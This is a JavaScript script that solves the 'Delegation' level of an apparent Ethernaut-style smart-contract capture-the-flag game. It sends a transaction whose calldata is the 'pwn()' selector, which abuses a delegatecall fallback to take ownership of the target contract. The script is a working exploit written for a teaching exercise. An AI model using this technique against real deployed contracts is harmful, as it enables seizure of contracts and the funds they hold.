const {BLOCK_EXPLORER_URL, DELEGATION_INSTANCE_ADDRESS} = require('./utils');
const web3 = require('web3');

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
    console.log('Delegation level');

    if (!DELEGATION_INSTANCE_ADDRESS) {
        console.log('Delegation instance address not found');
        return;
    }

    console.log('Delegation instance address', DELEGATION_INSTANCE_ADDRESS);

    const [attacker] = await ethers.getSigners();
    const factory = await ethers.getContractFactory("Delegation");
    const contract = factory.attach(DELEGATION_INSTANCE_ADDRESS);
    const data = web3.utils.sha3("pwn()");

    const tx = await attacker.sendTransaction({
        to: contract.address,
        data,
        gasLimit: 100000,
    });
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    console.log('\x1b[32m%s\x1b[0m', 'Delegation level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
